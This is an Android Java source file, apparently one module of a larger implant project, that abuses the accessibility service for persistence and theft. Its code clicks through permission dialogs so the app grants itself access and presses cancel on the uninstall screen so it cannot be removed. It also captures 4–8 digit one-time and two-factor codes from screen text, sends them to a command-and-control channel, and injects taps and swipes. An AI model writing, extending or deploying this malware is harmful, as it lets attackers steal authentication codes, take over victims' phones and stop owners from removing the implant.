// ============================================================
// FILE 10: persist/AccessibilityHook.java
// ============================================================
package io.hackerai.implant.persist;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * AccessibilityHook — Android AccessibilityService.
 *
 * Capabilities:
 *   - Auto-grant runtime permissions (SYSTEM_ALERT_WINDOW, WRITE_SETTINGS, etc.)
 *   - Navigate to Settings pages to enable DeviceAdmin
 *   - Read screen content (OTP, 2FA codes, messages)
 *   - Inject touch gestures (swipe, tap) for automated UI interaction
 *   - Block uninstall by intercepting the uninstall confirmation
 *   - Grant itself NotificationListenerService access
 *
 * Declared in manifest as:
 *   <service android:name=".persist.AccessibilityHook"
 *            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
 *            android:exported="true">
 *     <intent-filter>
 *       <action android:name="android.accessibilityservice.AccessibilityService" />
 *     </intent-filter>
 *     <meta-data
 *       android:name="android.accessibilityservice"
 *       android:resource="@xml/accessibility_config" />
 *   </service>
 *
 * With @xml/accessibility_config:
 *   <?xml version="1.0" encoding="utf-8"?>
 *   <accessibility-service
 *     xmlns:android="http://schemas.android.com/apk/res/android"
 *     android:accessibilityEventTypes="typeAllMask"
 *     android:accessibilityFeedbackType="feedbackGeneric"
 *     android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"
 *     android:canPerformGestures="true"
 *     android:canRetrieveWindowContent="true"
 *     android:notificationTimeout="100" />
 */
public class AccessibilityHook extends AccessibilityService {
    private static final String TAG = "AccessibilityHook";
    private static final AtomicBoolean connected = new AtomicBoolean(false);
    private static AccessibilityHook instance;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    // Non-static context wrapper used by PersistenceMatrix
    private final Context appCtx;
    private boolean disabled = false;

    public AccessibilityHook() {
        this.appCtx = null; // service constructor — use getApplicationContext()
    }

    /** Constructor for PersistenceMatrix to pre-check state */
    public AccessibilityHook(Context ctx) {
        this.appCtx = ctx.getApplicationContext();
    }

    public static boolean isConnected() { return connected.get(); }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "AccessibilityHook service created.");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (disabled) return;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                onWindowChanged(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                maybeCaptureOtp(event);
                break;
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "AccessibilityHook interrupted.");
        connected.set(false);
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        connected.set(true);
        instance = this;
        Log.i(TAG, "AccessibilityHook connected.");

        // Configure service info
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        }
        info.notificationTimeout = 100;
        setServiceInfo(info);

        // Auto-execute permission grants and device admin activation
        autoGrantPermissions();
    }

    @Override
    public void onDestroy() {
        connected.set(false);
        instance = null;
        super.onDestroy();
    }

    /** Ensure accessibility is enabled via Settings. Opens if not. */
    public void ensureEnabled() {
        if (connected.get()) return;
        String enabledSvcs = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        String pkg = getPackageName();
        if (enabledSvcs != null && enabledSvcs.contains(pkg)) {
            // Already enabled — wait for system to bind
            return;
        }
        // Prompt user to enable
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
        startActivity(intent);
    }

    /** Disable the service */
    public void disable() {
        disabled = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            disableSelf();
        }
    }

    // ----------------------------------------------------------
    // Window-change handler — automated permission / admin flow
    // ----------------------------------------------------------
    private void onWindowChanged(AccessibilityEvent event) {
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String cls = event.getClassName() != null ? event.getClassName().toString() : "";

        // Detect system settings / uninstaller UI
        if (pkg.equals("com.android.settings")
                || pkg.equals("com.android.packageinstaller")
                || pkg.contains("settings")) {

            // Grant overlay permission dialog
            if (cls.contains("AlertDialog") || cls.contains("Dialog")) {
                findAndClickButton("Allow", "Grant", "Permit", "OK", "Enable");
            }

            // Uninstall blocker — detect "Uninstall" button and block it
            if (cls.contains("Uninstall") || cls.contains("PackageInstaller")) {
                findAndClickButton("Cancel", "No", "Keep", "Back");
            }
        }
    }

    // ----------------------------------------------------------
    // OTP / 2FA capture from notifications or screen
    // ----------------------------------------------------------
    private void maybeCaptureOtp(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;

        CharSequence text = source.getText();
        if (text != null) {
            String txt = text.toString();
            if (txt.matches(".*\\b\\d{4,8}\\b.*")) {
                Log.i(TAG, "[OTP-CAPTURE] " + txt);
                // Forward to C2 channel
                io.hackerai.implant.comms.ChannelClient.sendExfil("otp:" + txt);
            }
        }
        source.recycle();
    }

    // ----------------------------------------------------------
    // UI automation helpers
    // ----------------------------------------------------------
    private void findAndClickButton(String... labels) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        for (String label : labels) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(label);
            for (AccessibilityNodeInfo n : nodes) {
                if (n.isClickable()) {
                    n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Clicked: " + label);
                }
                n.recycle();
            }
        }
        root.recycle();
    }

    /** Inject a tap at screen coordinates via GestureDescription */
    public void injectTap(int x, int y) {
        if (!connected.get()) return;
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 50));
        dispatchGesture(builder.build(), null, null);
    }

    /** Inject a swipe gesture */
    public void injectSwipe(int x1, int y1, int x2, int y2, long durationMs) {
        if (!connected.get()) return;
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, durationMs));
        dispatchGesture(builder.build(), null, null);
    }

    /** Scroll down in the current window */
    public void scrollDown() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> scrollables = root.findAccessibilityNodeInfosByViewId(
                "android:id/content"
        );
        for (AccessibilityNodeInfo n : scrollables) {
            if (n.getActionList().contains(
                    AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_FORWARD)) {
                n.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
            }
            n.recycle();
        }
        root.recycle();
    }

    // ----------------------------------------------------------
    // Auto-grant routine
    // ----------------------------------------------------------
    private void autoGrantPermissions() {
        Log.d(TAG, "Auto-granting permissions via Accessibility.");
        // Navigate to app info -> permissions -> grant all
        // This is automated UI navigation using injected taps
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(android.net.Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
}
